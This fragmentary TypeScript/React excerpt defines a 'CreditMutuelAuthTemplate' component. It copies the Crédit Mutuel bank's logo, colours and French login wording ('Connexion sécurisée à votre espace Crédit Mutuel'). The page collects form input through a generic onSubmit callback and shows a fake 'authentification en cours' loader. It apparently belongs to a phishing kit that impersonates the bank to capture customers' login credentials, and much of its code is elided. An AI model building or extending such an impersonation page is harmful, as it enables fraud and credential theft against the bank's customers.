...
interface CreditMutuelAuthTemplateProps {
  onSubmit: (formData: any) => Promise<boolean>;
}

export function CreditMutuelAuthTemplate({ onSubmit }: CreditMutuelAuthTemplateProps) {
  ...
  if (showLoader) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-700 to-blue-800 pt-20">
        <div className="max-w-4xl mx-auto px-4 py-8">
          <div className="bg-white rounded-2xl shadow-xl p-8">
            <div className="flex flex-col items-center justify-center py-16">
              <Loader2 className="w-12 h-12 animate-spin text-blue-700 mb-6" />
              <h2 className="text-2xl font-bold text-gray-800 mb-4">
                Authentification en cours...
              </h2>
              <p className="text-gray-600 text-center max-w-md">
                Connexion sécurisée à votre espace Crédit Mutuel en cours.
              </p>
            </div>
          </div>
        </div>
  ...
  return (
    <div className="min-h-screen bg-white">
      <div className="grid grid-cols-1 lg:grid-cols-2 min-h-screen">
          ...
          <div className="max-w-md mx-auto w-full">
            ...
            <div className="flex items-center justify-between mb-8">
              <div className="flex items-center">
                <img 
                  src="https://upload.wikimedia.org/wikipedia/fr/thumb/4/47/Logo_Cr%C3%A9dit_Mutuel.svg/1200px-Logo_Cr%C3%A9dit_Mutuel.svg.png" 
                  alt="Crédit Mutuel" 
                  className="h-8"
                />
              </div>
            ...
            <form onSubmit={handleSubmit} className="space-y-6">
              ...
              <div>
                ...
                <input
                  ...
                  className="w-full px-4 py-3 border border-gray-300 rounded focus:ring-2 focus:ring-blue-600 focus:border-transparent text-lg"
              ...
              <button
                ...
                className="w-full bg-blue-700 text-white font-semibold py-4 rounded hover:bg-blue-800 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
              >
        ...
        <div className="bg-gradient-to-br from-blue-700 to-blue-800 p-4 lg:p-8 flex flex-col justify-center text-white">
          <div className="max-w-md mx-auto w-full">
            ...
            <div className="text-blue-100 text-sm space-y-2">
              <p>• Banque coopérative depuis 1882</p>
